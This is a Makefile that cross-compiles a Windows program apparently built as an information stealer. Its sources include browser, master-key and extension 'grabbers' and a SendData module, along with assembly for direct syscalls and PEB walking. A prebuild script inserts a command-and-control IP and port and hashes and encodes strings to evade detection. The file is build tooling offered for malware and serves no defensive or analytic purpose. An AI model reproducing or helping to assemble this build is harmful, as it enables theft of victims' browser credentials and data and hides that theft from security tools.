CCX64=x86_64-w64-mingw32-gcc
CFLAGS = -Os -fpermissive -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -w -falign-labels=1 -fPIC
LFLAGS = -Wl,--no-seh,--enable-stdcall-fixup -mrdrnd -s -nostdlib -mwindows

CSRC = src/main.c src/decoding.c src/MasterKeyGrabber.c src/ExtensionsGrabber.c src/SendData.c src/DllOps.c src/FileIO.c src/MemoryUtils.c src/BrowserGrabber.c src/hashing.c src/StringUtils.c src/DirectoryOps.c src/globals.c src/AddrResolution.c src/PathOps.c
ASMSRC = src/asm/syscalls.asm src/asm/GetPEB.asm src/asm/NtAllocateCallBack.asm src/asm/LdrLoadDllCallBack.asm
COBJ = $(CSRC:.c=.o)
ASMOBJ = $(ASMSRC:.asm=.o)


TARGET= bin/main.exe


all: prebuild $(ASMOBJ) $(COBJ) $(TARGET) clean

prebuild:
	@ echo "Adding the C2 IP and PORT."
	@ echo "Hashing syscalls and functions and encoding strings."
	@ python3 build-tools/prebuild.py $(ip) $(port)


$(ASMOBJ):
%.o: %.asm
	@ echo "Assembling: $<"
	@ nasm -f win64 $< -o $@

$(COBJ):
%.o: %.c
	@ echo "Compiling C source file: $<"
	@ $(CCX64) $(CFLAGS) -c $< -o $@


$(TARGET):
	@ echo "Linking object files into executable: $@"
	@ $(CCX64) $(LFLAGS) $(COBJ) $(ASMOBJ) -o $@

clean:
	@ echo "Cleaning up"
	@ rm src/*.o
	@ rm src/asm/*.o
	@ echo "The executable is in the bin folder."
